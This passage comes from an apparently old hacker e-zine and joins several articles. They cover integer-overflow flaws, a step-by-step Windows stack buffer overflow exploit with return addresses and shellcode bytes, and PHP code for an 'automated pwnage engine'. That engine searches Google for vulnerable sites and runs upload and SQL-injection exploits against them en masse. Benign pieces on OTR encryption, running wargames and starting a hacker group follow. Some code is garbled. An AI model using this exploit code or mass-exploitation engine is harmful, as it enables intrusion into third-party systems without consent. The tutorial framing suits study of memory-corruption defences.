b0f\r\nexit(-1);\r\nstrncpy(buffer,argv[1],i);\r\nreturn 0;\r\n}\r\n\r\nThis is indeed an extremely gullible app, trusting the user with inputting the\r\nlength of the data, but these constructs occur more often than you think, more\r\nobscurely and complex yes, but they occur nontheless. Now, this app checks if s\r\nis bigger than 19, which would cause a potential b0f, so it 'prevents' it this\r\nway. What's wrong though is this line:\r\n\r\nunsigned short s = i;\r\n\r\nsince atoi returns a signed 32-bit int which can hold up to 2,147,483,647 and an\r\nunsigned short can only hold up to 65,535, thus we could input 65,536 in\r\nargv[2], overflowing s (and setting it to 0) bypassing the bounds checking and\r\noverflowing the buffer anyway.\r\n\r\nNow, the following example will incorporate several vulnerablilities in one app:\r\n\r\nchar* UserBuffer = (char*)malloc(10);\r\nint TrustedData = (int)malloc(4);\r\nmemcpy(&TrustedData,&SomeTrustedSource,4);\r\nint len = atoi(argv[2]);\r\nshort l = len; // [V1]\r\nif(l > 9) // [V1.5]\r\nexit(-1);\r\nstrncpy(UserBuffer,argv[1],len); //[V2]\r\nif (TrustedData + SomeUserSuppliedValue > SomeLimit) // [V3]\r\nDoSomethingElse()\r\n\r\nOk, the first vuln lies with [V1], where len is converted to a short from an\r\nint, like discussed earlier this can help us bypass the boundschecking at [V1.5]\r\nand copy more data to UserBuffer [V2] than it can handle and heap overflow\r\nTrustedData (we should copy (addr of TrustedData's allocated area), (addr of\r\nUserBuffer's allocated area) bytes to UserBuffer and all data after that will\r\noverwrite the data in TrustedData, which is assumed to originate from\r\nSomeTrustedSource. We can for example exploit this as a signedness error, Making\r\nTrustedData negative, thus bypassing the boundschecking at [V3], and potentially\r\noverflowing data that relies on SomeUserSuppliedValue as a limit.\r\n\r\nOutro:\r\nWell, I hope you liked the article and learned something new from it.

Some basic details about C programming and\r\nsome very simple ASM knowledge will help. Things such as how the EBP and ESP\r\nregisters function in relation to a functions stack frame and how some ASM\r\ninstructions manipulate the call stack. Every tutorial in the world tells you \r\nexactly what these things do and there is plenty of documentation. \r\n\r\nSo I am going to give as little background as possible with these aspects, and\r\nfocus on the less often addressed aspect of how to do a buffer overflow exploit\r\non Windows. If you do not have any  background, and may have scrolled down and\r\nfound a lot of what is written sounds like a foreign language, then I you might\r\nfind the information from 'Smashing the Stack' [3] could be valuable\r\nprerequisite reading, especially information before the section about writing\r\nshell code.\r\n\r\nAlso, I can suggest the IA-32 Developer's Manual Vol. 1 to teach yourself. All\r\nof Chapter 6 of the manual devoted to explain how calling conventions work, how\r\nthe stack is set up, and other useful information. It can be found here:\r\n\r\nhttp://www.intel.com/design/pentium4/manuals/index_new.htm\r\nftp://download.intel.com/design/Pentium4/manuals/25366519.pdf\r\n\r\nDon't let this seem too daunting, you will hopefully be able to find most of the\r\nconcepts pretty simply. So let us jump right into things. Here's some simple\r\ncode that will crash because it overwrites special memory, used to control\r\nexecution, on the stack.\r\n\r\n================================================================================\r\n\r\n#include <string.h>\r\n\r\nvoid copy(char *s) \r\n{\r\n\tchar buf[256];\r\n\tstrcpy(buf, s);\r\n}\r\n\r\nint main()\r\n{\r\n\tchar buffer[512];\r\n\r\n\tfor(int i = 0; i < 512; i++)\r\n\t\tbuffer[i] = 'X';\r\n\r\n\tcopy(buffer);\r\n\treturn 0;\r\n}\r\n\r\n================================================================================\r\n\r\nThe function copy(char*) makes a very careless mistake. It is a useless\r\nfunction, which copies one string to another. Unfortunently, the source string\r\nis larger than the local one, and writes into special memory which it shouldn't\r\ntouch. Here is how our program's stack memory looks before the strcpy happens:\r\n\r\n\r\n\r\n/-------------------------\\\r\n|                         |  lower\r\n|                         |  memory\r\n|        256 buffer       |    \r\n|   [hfsdkfhakjlasghkdl]  |    /\\\r\n|                         |   /__\\\r\n|       0xEBP - 0xRET     |    ||\r\n|                         |    ||\r\n|   copy()'s stack frame  |    ||\r\n|-------------------------|    ||\r\n|          args           |    ||\r\n|-------------------------|    ||\r\n|                         |    ||\r\n|        512 buffer       |    ||\r\n|   [XXXXXXXXXXXXXXXXXX]  |    ||\r\n|   [XXXXXXXXXXXXXXXXXX]  |    ||\r\n|                         |    ||\r\n|       0xEBP - 0xRET     |    \r\n|                         |  higher\r\n|   main()'s stack frame  |  memory\r\n\\------------------------/  \r\n\r\n\r\n\r\nWhen strcpy tries to copy the 512 byte buffer into the 256 byte buffer, some\r\nfunny things happen. It disregards that the destination is too small, and\r\noverwrites the RET address and the saved EBP. So then it kinda looks like (58 is\r\nthe ASCII value of 'X')\r\n\r\n\r\n/-------------------------\\\r\n|                         |  lower\r\n|                         |  (top)\r\n|        256 buffer       |\r\n|   [XXXXXXXXXXXXXXXXXX]  |    /\\\r\n|    0x585858, 0x585858   |   /__\\\r\n|                         |    ||\r\n|   copy()'s stack frame  |    ||\r\n|-------------------------|    ||\r\n|          args           |    ||\r\n|-------------------------|    ||\r\n|                         |    ||\r\n|                         |    ||\r\n|        512 buffer       |    ||\r\n|   [XXXXXXXXXXXXXXXXXX]  |    ||\r\n|   [XXXXXXXXXXXXXXXXXX]  |    ||\r\n|       0xRET - 0xEBP     | \r\n|                         | (bottom)\r\n|   main()'s stack frame  |  higher\r\n\\------------------------/  \r\n\r\n\r\nThis represents how the RET address is overwritten. strcpy runs past the ends of\r\nour 256 byte buffer, and overwrites the EBP and EIP. So now, when the function\r\ntries to return from the function calling the RETN instruction in assembly, it\r\npops 0x58585858 into EIP which is invalid, and the program crashes. You can see\r\nthis by checking the registers. This opens up some possibilities for us. We\r\ncould potentially overwrite the EIP with anything that we want, have it go\r\nexecute whatever code we wanted, and hijack the flow of the program.\r\n\r\nAll this, you may have already known. But, there are several things on the\r\nWindows platform that change the circumstances of this. To see what we are going\r\nto do now, let's take a close look at copy()'s stack frame.\r\n\r\n<lower                                     <higher\r\n memory>                                    memory>\r\n [ESP                                         EBP]\r\n  ||                                           ||\r\n  \\/                                           \\/\r\n\r\n[data, including the buffer, on stack] [saved ebp] \r\n[ret] [args] [main()'s stack frame =>]\r\n  ^\r\n  |\r\n<< target >>\r\n\r\n\r\n\r\nIn this problem, we have almost full control over the stack. strcpy will copy\r\nany data that we want onto the stack, provided it does not contain any null\r\nbytes (which strcpy see's as the end of a string). So now, let's take a look at\r\nthis vulnerable function after compilation. Compiled with VC++ and trimming the\r\nfat which initializes data on the stack and saves registers:\r\n\r\n================================================================================\r\n\r\nPUSH EBP\r\nMOV EBP,ESP\r\nSUB ESP,140\r\n\r\nMOV EAX,DWORD PTR SS:[EBP+8]\r\nPUSH EAX\r\nLEA ECX,DWORD PTR SS:[EBP-100]\r\nPUSH ECX\r\nCALL main.strcpy\r\nADD ESP,8\r\n\r\nADD ESP,140\r\nMOV ESP,EBP\r\nPOP EBP\r\nRETN\r\n\r\n================================================================================\r\n\r\nSo, essentially, we have control over all the memory from EBP-100 and up,\r\nbecause strcpy does not check whether the buffer is large enough. So now we need\r\nto hijack the program by overwriting the RET which is at EBP+4 and making it EIP\r\nreturn to somewhere else. The way I am presenting is the most basic was we can\r\ndo this, but this concept may be sort of abstract for you autistic kiddo's, so\r\nread carefully.\r\n\r\nIf we can find where the RET is on the stack, we can overwrite it with whatever\r\nwe want and alter the flow of execution. If all was perfect, we could make it\r\npoint right to our shellcode. But we may not know the exact address of our\r\nshellcode on the stack, so this might be difficult. So, what we can do, is make\r\nthe RET jump to an instruction, which will take the form of\r\n\r\nJMP/CALL <SOMEREGISTER>\r\n\r\nWhere SOMEREGISTER is a register like EAX, ESP, EBX, as close to your shellcode\r\nas possible. In our code, for example, we are very lucky in that the function\r\nstrcpy(..) returns a pointer to the destination buffer, which we have control\r\nover, and return values are in EAX. So, we need to find an instruction that is\r\nJMP EAX or CALL EAX. \r\n\r\nOne way that we can do this is by using the OLLYUNI plug-in\r\n(http://www.phenoelit.de/win/index.html)\r\n\r\nTo use, put the plug-in DLL in the same dir as the Olly executable, start up the\r\ndebug, right click the disassembly window, and go to Overflow Return Address,and\r\nthen select ASCII Overflow Returns, and then JMP/CALL EAX. It will freeze for\r\nawhile trying to search for the instruction in memory, but then finish after\r\nabout a minute. Then, right click again, and write the values to a file, and it\r\nwill show you the address of an instruction in memory. You will want to choose a\r\nvalue that is in a loaded DLL. I, for example, found one at 0x7C816353 in\r\nkernel32.dll. \r\n\r\n================================ NOTE NOTE NOTE ================================\r\n--------------------------------------------------------------------------------\r\n| The address of such an instruction on your machine may not match mine!       |\r\n|                           Search for yourself!                               |\r\n--------------------------------------------------------------------------------\r\n\r\nSo here's how the stack is laid out. We are going to write past the end of the\r\nbuffer, to the RET value, and overwrite the RET with the address of a JMP / CALL\r\nEAX instruction:\r\n\r\n\r\n[ (..... EBP-100 .....) (... EBP ...) (... EBP + 4 ...) ]\r\n   ^                                 \r\n   |    < Buffer -------> Saved EBP --------> RET >\r\n   |                                           |\r\n   |___________________________________________|\r\n\r\n\r\nSo, I needed 104h, 260, bytes of junk, before I get to the RET. If for some\r\nreason your situation is different you can start small and keep adding onto the\r\nend of a buffer filled with your data, to make the program crash and determine\r\nthe size of the buffer, keeping an eye on EIP when it is crashing. Then, you can\r\nreplace the end of it with the address of your JMP EAX instruction. The scene of\r\nthe crime:\r\n\r\n================================================================================\r\n\r\n#include <string.h>\r\n\r\nvoid copy(char *s) \r\n{\r\n\tchar buf[256];\r\n\tstrcpy(buf, s);\r\n}\r\n\r\nint main()\r\n{\r\n\tchar buffer[512];\r\n\r\n\tfor(int i = 0; i < 260; i++)\r\n\t\tbuffer[i] = 'X';\r\n\r\n\t*(int *) (buffer + 260) = 0x7C816353;\r\n\r\n\tcopy(buffer);\r\n\treturn 0;\r\n}\r\n\r\n================================================================================\r\n\r\nIt worked first try, and redirected execution to where all those 'X's were. So,\r\nwhat if we replaced that with some executable code instead of some 'X's? This is\r\ncalled shellcode. It consists of some compiled opcodes that we throw into the\r\ngearworks of a vulnerable program to make it do what we want. For simplicity and\r\nbecause some useful shellcode is outside the scope of this article, let's just\r\nmake some very simple shellcode.\r\n\r\n================================================================================\r\n\r\n#include <windows.h>\r\n\r\nint main()\r\n{\r\n\tMessageBox(0, 0, 0, 0);\r\n\tExitProcess(0);\r\n\r\n\treturn 0;\r\n}\r\n\r\n================================================================================\r\n\r\nThen, debug the program, step into it, and see where it takes you off to. The\r\nbase address that the DLL is loaded at varies in different Windows\r\ndistributions, and makes this shellcode very unportable The address you find\r\nwill probably different, but stepping through the program, I found that\r\nExitProcess is at 0x7c81caa2 and MessageBox at 0x77d804ea.\r\n\r\n================================ NOTE NOTE NOTE ================================\r\n--------------------------------------------------------------------------------\r\n| The address of such an instruction on your machine may not match mine!       |\r\n|                           Search for yourself!                               |\r\n--------------------------------------------------------------------------------\r\n\r\nThe address of such an instruction on your machine may not match mine! Search\r\nfor yourself! So here's what I made. A simple shellcode, this is not the point\r\nof the tutorial. See Delikon's Windows shellcode-picture Book\r\n(http://www.delikon.de/shellbuch/eng/1.html) for more info on this very basic\r\ntechnique for making Windows shellcode. \r\n\r\n================================================================================\r\n\r\n; Assembles NASM -fbin prog.asm\r\n\r\n[BITS 32]\r\nstart:\r\n\txor edx, edx         ; Avoids NULL byte\r\n\tpush edx             ; MsgBox type\r\n\tpush edx             ; MsgBox body\r\n\tpush edx             ; MsgBox caption\r\n\tpush edx             ; Owner hWnd\r\n\tmov eax, 0x77d804ea  ; Addr of MessageBox, USER32 should be loaded\r\n\tcall eax\r\n\r\n\txor eax, eax         ; Avoids NULL byte     \r\n\tpush eax             ; Exit code\r\n\tmov eax, 0x7c81caa2  ; Addr of ExitProcess, KERNEL32 should be loaded\r\n     \tcall eax\r\n\r\n================================================================================\r\n\r\nI then extract the shellcode from the compiled program, using a program or a hex\r\neditor. It corresponds to the opcodes which would make a message box saying\r\nerror pop up, and then exit. So now I make a small program which will put our\r\nshellcode at the start of the buffer that we control, and then jump to the start\r\nof it using a JMP EAX call.\r\n\r\n================================================================================\r\n\r\n#include <string.h>\r\n#include <stdio.h>\r\n\r\nchar shellcode[] = \r\n\t\"\\x31\\xD2\\x52\\x52\\x52\\x52\\xB8\\xEA\\x04\\xD8\\x77\\xFF\"\r\n\t\"\\xD0\\x31\\xC0\\x50\\xB8\\xA2\\xCA\\x81\\x7C\\xFF\\xD0\";\r\n\r\nvoid copy(char *s) \r\n{\r\n\tchar buf[256];\r\n\tstrcpy(buf, s);\r\n}\r\n\r\nint main()\r\n{\r\n\tchar buffer[512];\r\n\r\n\tfor(int i = 0; i < 260; i++)\r\n\t\tbuffer[i] = 'X';\r\n\r\n\t//\r\n\t// Shellcode placed at start of exploit buf\r\n\t// 0x7C816353 is a JMP EAX instruction\r\n\t//\r\n\r\n\tmemcpy(buffer, shellcode, strlen(shellcode));\r\n\t*(int *) (buffer + 260) = 0x7C816353;\r\n\r\n\tcopy(buffer);\r\n\tprintf(\"If we got here, it didn't exit like it should have\");\r\n\treturn 0;\r\n}\r\n\r\n================================================================================\r\n\r\nThis is how our specially crafted exploit buffer looks when laid out next to the\r\nactual memory\r\n\r\n\r\nexploit: < shellcode >  < xxxxxxxxxxxxxxxxxxxxxxxxxxxxx > < altered RET >  \\\r\nmemory : < bufferbufferbufferbufferbuffer > < saved EBP > < real RET >     /\r\n                                                                           \r\n\r\nThe result it returns to our altered RET address, JMP EAX takes us back to our\r\nshellcode. There is another register which allows our shellcode to be executed\r\nif we alter our program. We can have our program JMP ESP, This happens to work\r\nout very nicely. Let me show you the example and explain it afterwards.\r\n\r\n================================================================================\r\n\r\n#include <string.h>\r\n#include <stdio.h>\r\n\r\nchar shellcode[] = \r\n\t\"\\x31\\xD2\\x52\\x52\\x52\\x52\\xB8\\xEA\\x04\\xD8\\x77\\xFF\"\r\n\t\"\\xD0\\x31\\xC0\\x50\\xB8\\xA2\\xCA\\x81\\x7C\\xFF\\xD0\";\r\n\r\nvoid copy(char *s) \r\n{\r\n\tchar buf[256];\r\n\tstrcpy(buf, s);\r\n}\r\n\r\nint main()\r\n{\r\n\tchar buffer[300];\r\n\tfor(int i = 0; i < sizeof(buffer); i++)\r\n\t\tbuffer[i] = 'X';\r\n\r\n\t//\r\n\t// 0x7C82385D is a JMP ESP instruction\r\n\t// Shellcode placed after overflowed RET\r\n\t//\r\n\r\n\t*(int *) (buffer + 260) = 0x7C82385D;\r\n\tmemcpy(buffer + 264, shellcode, strlen(shellcode));\r\n\r\n\tcopy(buffer);\r\n\tprintf(\"If we got here, it didn't exit like it should have\");\r\n\treturn 0;\r\n}\r\n\r\n================================================================================\r\n\r\nNow let's look at the stack right as the function is going to return. Right as\r\nthis code is going to execute, and the stack around this area. ESP value next to\r\ninstruction indicates the value of ESP after it has executed.\r\n\r\nMOV ESP,EBP ; ESP = 0012FDF8\r\nPOP EBP     ; ESP = 0012FDFC\r\nRETN        ; ESP = 0012FE00\r\n\r\n0012FDF8   58585858 << This is the EBP we overwrote with 'X's\r\n0012FDFC   7C82385D << This is the RET to the JMP ESP, which is now 0012FE00\r\n0012FE00   5252D231 << This is the start of the shellcode immediately after\r\n0012FE04   EAB85252 \r\n0012FE08   FF77D804\r\n0012FE0C   50C031D0\r\n0012FE10   81CAA2B8\r\n0012FE14   58D0FF7C\r\n0012FE18   58585858\r\n\r\nSo ESP and EBP start there right before the RET. Then 58585858 is POP'ed into\r\nEBP, and our new RET is RETN'ed and goes to JMP ESP. At that point, ESP is has\r\nalso been decremented, and now points to our shellcode immediately following the\r\nRET. Convenient! I think we are ready to attack our first application. It is a\r\nwimp, and I think you can do it. Here's the vulnerable little thing\r\n\r\n================================================================================\r\n\r\n#include <string.h>\r\n\r\nint main(int argc, char ** argv)\r\n{\r\n\tchar buf[256];\r\n\tif(argc == 2)\r\n\t\tstrcpy(buf, argv[1]);\r\n}\r\n\r\n================================================================================\r\n\r\nThe exploit program only adds one more dimension to our existing programs; now\r\nwe have a JMP ESP instruction pointer, and our shellcode is placed right after\r\nit.

This time with an\r\narticle on the increasingly populair concept of an \"artificial hacker\". When\r\nthinking of an \"artificial hacker\" I don't mean some uberly complex neural\r\nnetwork that analyzes source-code for potential vulnerabilities and writes\r\nexploits for them . I'm \"merly\" talking about an automated framework for\r\nmass-exploitation of certain vulnerabilities.\r\nAs described in the articles \"Automation\" (located here:\r\nhttp://blackhat.com/presentations/bh...-sensepost.pdf) and \"Moving towards the\r\nArtificial Hacker\" (located here:\r\nhttp://felinemenace.org/papers/Movin...hley_Fox.p pt\r\n) there are many pros and cons for this concept. Pentesting/Attacking would be\r\nmade much easier and a lot of the boring work would be taken from the hacker,\r\nallowing him some time for a beer.\r\nOf course this sound pretty tame and all, and my quick implementation might not\r\nbe the best, but the concept surely is powerfull as hell. Imagine a huge\r\nexploitDB (like milw0rm's of securityforest's linked to A/APE, which would\r\n(providing it has a dork for every vuln (or it could scan random ip-ranges))\r\nexploit the fuck out of the net, pwning vulnerable box after vulnerable box,\r\nwhile the \"only thing\" the controlling hacker has to do is find exploits and\r\nwrite A/APE modules and supply them to the engine, rooting an astronomical\r\nammount of boxes in no-time (providing he/she has multiple A/APE scripts\r\nrunning).\r\nThe idea of an automated exploitation framework crossed my mind when working on\r\na web-worm in PHP (whose concept was featured in HackThisZine #3) for the next\r\nrelease of the RRLF e-zine (#7). A/APE (Artificial/Automated Pwnage Engine) is a\r\nmodification of Ouroboros' engine that consists of an exploit 'class' (just a\r\nstupid small template which would have been an abstract class if it weren't for\r\nthe necessity of backwards compatibility with PHP4 for the webworm) with several\r\nchild classes each with their own exploit code located in a similarly\r\nconstructed Sploit() function, thus allowing for heavy use of class polymorphism\r\n(and less lines of code).\r\n\r\n[0x01] The concept\r\nWell, there are three major requirements for A/APE:\r\n1) The engine should spider all vulnerable targets on the web (or as much as\r\npossible)\r\n2) The engine should be very modular (easily extendable, different sploits\r\nadaptable to 1 standard)\r\n3)The engine should log results so the hacker can control the pwned targets\r\nlater.\r\nRequirement 1 is simple to complete, we'll use the unlimited power of google.\r\nNow I hear everyone mumbling \"tskpscht google api tskpscht\" but no worries, I\r\ndon't like the google API either (I actually don't care if you like it at all, I\r\njust don't like it). It is very easy to use google without having to do all the\r\ngoogle-api hassle with the following concept:\r\n\r\n1) Post a GET request to google.com with the following parameters:\r\nsearch?as_q=\".UrlEncode($searchquery).\"&num=\".$sta rtfromthisresult.\"&hl=en\r\n\r\n2) Add the found targets to the $targets array. Check whether we have reached\r\ntoo much queried results (we don't want to stick to the same vuln forever now do\r\nwe?) if so quit else goto step 1\r\n\r\nWell, the biggest dificullilty lies with requirement 2. We can devide all major\r\nand common webapp-vulns (we'll only discuss webapp-vulns in this article) into 4\r\ncatogories:\r\n\r\n1)Unauthorized file uploading\r\n2)Local/Remote file inclusion\r\n3)SQL injection\r\n4)XSS\r\n\r\nSo we'll organize the exploits like this (in a matrix form):\r\n\r\n$Sploits = array();\r\n$Sploits[0] = array(); // array of all file upload exploits\r\n$Sploits[0][0] = new WhateverExploit();   //etc,etc\r\n\r\nAlso we should manage all \"googledorks\" (google searchqueries to find targets)\r\nlike this (thus googledorks $dork[0][3] being the dork for $Sploits[0][3]).\r\nSince every exploit is different in concept and requires diffent parameters, I\r\ngeneralized the concept per exploit (currently only Fileupload exploits and SQL\r\nexploits):\r\n\r\nUpload exploits: Sploit($host,$port,$path,$filename,$filecontent){}\r\nSQL injection: Sploit($host,$port,$path,$sql,$username,$pass){}\r\n\r\nSince most file upload exploits require little more than a target and a file,\r\nthis'll suffice. The case of the SQL injection is a little different though. SQL\r\ninjection usually requires nothing more than a prefab SQL query, which can be\r\ndefined in\r\nSQLSploit->SQLQ, the sample exploit I included with this A/APE release required\r\na username and password for user creation though (this is also quite common) so\r\nI included these parameters with the function prototype (feel free to change\r\nthem to you hearts content though).\r\n\r\n[0x02] Show use the 0xC0DE!\r\nOkay, let's talk code. Sending a packet in PHP is simple as pie:\r\nfunction sendpacket($host,$port,$pAcKeT) // packet sending function\r\n{ $ock=fsockopen(gethostbyname($host),$port); // open socket\r\nif (!$ock) return \"No response\";\r\nfputs($ock,$pAcKeT); // send!\r\n$HtMl=''; while (!feof($ock)) { $HtMl.=fgets($ock); // read socket }\r\nfclose($ock); return $HtMl; }\r\n\r\nTo google for targets we need to follow the steps discussed in section 0x01.\r\nHere is a function that googles for a certain query.\r\n\r\nfunction Google4Targets($host,$search,$num) // google for targets\r\n{$query = \"/search?as_q=\".UrlEncode($search).\"&num=\".$num.\"&hl =en\";$q =\r\n\"http://\".$host.$query;\r\n$packet =\"GET \".$q.\" HTTP/1.0\\r\\n\"; // Get packet\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$html = sendpacket($host,80,$packet); // send it\r\n$temp=explode(\"of about <b>\",$html); // get number of results\r\n$temp2=explode(\"</b> for \",$temp[1]);\r\n$total=$temp2[0];\r\n$total = str_replace(\",\",\"\",$total);\r\n$looplen = $total / $num; // number of pages to query\r\nfor($r = 0; $r < $looplen; $r++)\r\n{\r\n$strt = $r * $num;\r\n$query = \"/search?as_q=\".UrlEncode($search).\"&num=\".$num.\"&hl =en&start=\".$strt;\r\n// query\r\n$q = \"http://\".$host.$query;\r\n$packet =\"GET \".$q.\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$html = sendpacket($host,80,$packet);\r\n\r\n$temp=explode(\"<a class=l href=\\\"\",$html); //all url results are in<a class=1\r\nhref=\"urlhere\"> form\r\nfor ($i=1; $i<=count($temp)-1; $i++) {\r\n$temp2=explode(\"\\\">\",$temp[$i]);\r\n$targets[$targetcount] = $temp2[0]; // add to targets array\r\n$targetcount++; } } }\r\n\r\nThe auto exploitation engine would look like this:\r\n\r\nfunction AutoXploit() // exploit routine\r\n{ for ($l = 0; $l < count($dork); $l++) {\r\nfor($i = 0; $i < count($dork[$l]; $i++) // all dorks of current subgroup\r\n(XSS,SQL injection,etc) {\r\n$targets = array();\r\n$targetcount = 0;\r\nGoogle4Targets(\"www.google.com\",$dork[$l][$i],100); // google them\r\nif ($targetcount > $searchlimit) // not higher than limit\r\n$targetcount = $searchlimit;\r\nfor ($x = 0; $x < $targetcount; $x++) {\r\n$targets[$x] = eregi_replace(\"http://\", \"\",$targets[$x]);\r\n$temp = explode(\"/\",$targets[$x]); // deconstruct URL\r\n$base = $temp[0];\r\n$extend = \"/\";\r\nfor($r = 1; $r < count($temp)-1; $r++) {\r\n$extend .= $temp[$r].\"/\"; }\r\nif($l == 0) // UPLOAD\r\n$sploits[$l][$i]->Sploit($base,80,$extend,$shellname,$shellcontent);\r\nelseif($l == 1) // SQL\r\n$sploits[$l][$i]->Sploit($base,80,$extend,$sploits[$l][$i]->SQLQ,$user,$pass);}}\r\n }  }\r\n\r\nWell I hope this small article was usefull and gave you some insights and/or\r\nIdeas.

It uses\r\npublic/private encryption and signs all your messages with a digital signature\r\nto verify that you are their true sender. Unencrypted instant messages are\r\neasily picked up by packet sniffing tools, these becomes all the easier when\r\nyour sending them over a public WIFI network. Also with the new AOL Terms of\r\nService they claim by using their software you \"Waive any right to privacy.\"\r\nWell fuck that, start encrypting your messages and show AOL you do have the\r\nright to privacy especially from them. Installing the plugin is easy as can be.\r\n\r\nInstall: Download the latest release from http://www.cypherpunks.ca/otr as of\r\nthis writing the latests version is 3.0.0. Once you compile the sources, or if\r\nyour using windows run the .exe, you have to enable Off The Record. To do this\r\nin gaim click on Preferences, or Tools > Preferences from within the buddy list\r\nwindow. Once in the Preferences menu choose \"Plugins\" from the left menu. Scroll\r\ndown untill you see \"Off-The-Record Messaging\" click on the check box to enable\r\nit.\r\n\r\nConfigure: Now that you have it installed there should be a submenu under the\r\nplugins menu for OTR. Click on the \"Config\" tab. Here you can generate your key\r\npair. Click the generate to produce your keys. Also make sure that Enable\r\nprivate messaging an Automatically initiate private messaging are checked.\r\n\r\nUsage: Now when ever you talk to someone who also has OTR you will begin a\r\nprivate converstation. The First time you talk to them you will be prompted to\r\naccept their fingerprint. The fingerprint is a string which is used to idenify\r\ntheir key. Also you will notice a new button on your conversation window, that\r\nwill eather say OTR: Private, if a private conversation has been started, else\r\nit will show OTR: Not private. To start a private conversation simpily click\r\nthis button.\r\n\r\nAdditional help: http://www.cypherpunks.ca/otr   http://www.hackbloc.org/forums/\r\n\r\n################################################################################\r\n#                     HOW TO: Start A Wargames Competition                     #\r\n\r\n################################################################################\r\n\r\nAs one of the designers of the Root This Box challenge, I'd like to share\r\nsomethings I've learned about creating and maintaining an exciting, safe\r\nwargame.\r\n\r\n0. Users\r\nA contest is nothing without users. Try to find a good mixture of skills from\r\nonline and offline communities. Recruit people of skill from 2600 meetings,\r\nLUGs, classes, IRC channels, or anywhere else where smart people tend to\r\ncongregate.\r\n\r\n1. Boxes\r\nThe targets you setup are also critical to the success of the competition. Try\r\nto get interested users from step 0 to pony up some of their spare boxes for the\r\ncompetition. A variety of operating systems, services, and vulerabilities tends\r\nto be most fun. Some successful boxes have run custom services with source\r\ndisclosure. Others have setup unpatched services with an intended progression of\r\nescalation. Some of the others have just been regular boxes with some unintended\r\nholes. Optionally, you may consider equipping a small number of systems with\r\nvirtual machine software to get a larger system diversity with a smaller number\r\nof systems, but this option does require considerably more configuration.\r\nHowever these boxes are setup, the more boxes and diversity, the more likely it\r\nbecomes that at least a few are crackable.\r\n\r\n2. Rules\r\nA set of well-defined rules can give a contest enough form for good fun, but\r\ntrusting users to follow policies may not be the best way to enforce your\r\npolicies. Consider automating and configuring rules into your competition\r\nwherever possible. One of the primary rules should be not interfering with\r\nothers' abilities to play the game, so restrictions should be implemented on\r\nchanging passwords, process usage, disk space allocation, and anything else that\r\nmight affect other users' ability to play. In addition, some users might use\r\ncompetition servers as hops for rather nefarious deeds, so it might be wise to\r\nlimit the use of network utilities to external targets.\r\n\r\n3. Scoring\r\nThere are many potential ways to calculate scores for these things. All revolve\r\naround who currently has control of a system. One way involves computing points\r\nfor the presence of certain service types of services, but this does take a fair\r\namount of code. A fixed score for each box will function well too. Scores might\r\nbe computed hourly, daily, at the end of a competition, or whenever. There is\r\nplenty of room to use your immagination on this topic.\r\n\r\n4. Timeframe\r\nIt is important that the challenge doesn't expire before any boxes are cracked\r\nand keeps up a suspenseful level of activity from start to finish. Choose your\r\ntimescale to fit the competition type and to maximize the fun.\r\n\r\nHappy hacking.\r\n\r\n################################################################################\r\n#                           HOW TO: Start A Hackbloc                           #\r\n################################################################################\r\n\r\n While the internet can be a great resource for learning, it can also be a very\r\nalienating place. If we want this movement to grow, we not only need to get\r\norganized but we need to get local. What better way to do this than to START\r\nYOUR OWN HACKBLOC.\r\n\r\nPRIVATE AFFINITY GROUPS vs PUBLIC MEETINGS\r\nThere are advantages and disadvantages to each model of organization. Certainly\r\nhaving open meetings at a public space that you can advertise would be more\r\nfriendly to draw in new people and give presentations. However such environments\r\nare not appropriate for more sensitive work and research, where holding private\r\nmeetings at more secure locations would be more suitable. Forming an affinity\r\ngroup of a few trusted people who already know each other, where skills\r\ncomplement each other, and where everybody knows the level of dedication /\r\nsecurity to each other is best suited to more hands-on or questionable\r\nactivities. Successful hackbloc groups would maintain a balance between both\r\npublic/announced and private/work meetings.\r\n\r\n* Look for Existing Groups\r\nThere may already be get-togethers in your area of people working on similar\r\nstuff. Look for linux user groups, 2600 meetings, hackbloc, hacklabs, binrev\r\nmeetups, ACM or other CS college groups, computer co-ops, or otherwise. Check\r\nout a few meetings to get the feel if it is what you are looking for. If not,\r\ntalk to organizers and see if you can help organize the group to make it\r\nexciting and active again. Otherwise you can make contacts and resources to\r\nbuild for your own meetings.\r\n\r\n* Look for public spaces to hold meetings\r\nThe best spots would be centrally located geographically and easy to find\r\nespecially through public transportation. Major urban areas, cities, or college\r\ncampuses would be ideal as these are likely to contain the greatest\r\nconcentration of potential members.\r\n\r\nNext, try to find a space or room to hold the actual meetings. For open meetings\r\nit would have to be in a public place (or a friendly commercial location). At a\r\nminimum , it would have to be big enough for tables and chairs for a dozen\r\npeople, with access to power, internet, and room to set up networks and other\r\nequipment. Some possible locations would be public libraries, college campuses,\r\nart/activist spaces or coops, friendly internet cafes, infoshops, community\r\ncenters, etc. Some groups have had success with meeting at a coffee hop\r\nespecially ones located at major transportation centers convenient for people\r\ntaking the train. The first few meetings can be just a temporary meetup spot\r\nuntil people can talk about more accommodating or convenient locations for a\r\nmore permanent meeting space that you could send out public announcements.\r\n\r\nWhen exploring possible spaces, talk to the management and introduce yourself\r\nand the group you are starting. Explain it positively using words like\r\n'teaching' and 'sharing', not 'hacking' and 'pirating', and if it is a business\r\nexplain that you might be able to bring them some customers. Some places it\r\ncould be advantageous to be 'sponsored' by an internet cafe or becoming an\r\n'official' student group, as long as it does not compromise the ideals or\r\npractice of the group.\r\n\r\n* Gather Resources + Equipment\r\nAt the bare minimum, the meeting space needs to have tables/chairs, power, and\r\nthe internet. However, there are all sorts of fun toys you can bring that will\r\nhelp facilitate the meeting as well as provide interesting workshops for people\r\nto teach and learn. Routers + ethernet cables not only allow you to share files\r\nor play multiplayer games but building a network can be a hands-on learning\r\nexperience for those who've never done it before. A wireless router would be\r\nideal. A sound system would be good for presentations or playing music in the\r\nbackground - also if meetings get big enough or if you have an awesome space to\r\nthrow parties at, you can bring bands or DJs and have bouncing dance parties\r\nafter the meet. Chalkboards, white-boards, overhead or digital projectors are\r\nideal for presentations, workshops, or other collaborative brainstorming\r\nactivities. Printers would be good for copying flyers, zines, posters, bits of\r\ncode, etc. People can also bring monitors and \"junk boxes\" so people can build\r\nsystems that people can play with - especially to tinker with new or obscure\r\noperating systems or use as public computers for those who don't bring their\r\nown. These are just a few toys and accessories one can bring: and make sure it's\r\nclear to attendees that they are free to bring their own goodies as well!\r\n* Outreach + Promotion\r\nFor public gatherings, consider doing some outreach to bring 